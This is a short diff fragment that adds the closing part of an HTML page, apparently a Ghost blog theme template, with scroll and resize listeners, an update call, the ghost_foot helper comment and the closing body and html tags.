+    window.addEventListener('scroll', onScroll, {passive: true});
+    window.addEventListener('resize', onResize, false);
+
+    update();
+});
+</script>
+
+    
+
+    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
+    <!-- ghost_foot -->
+
+</body>
+</html>
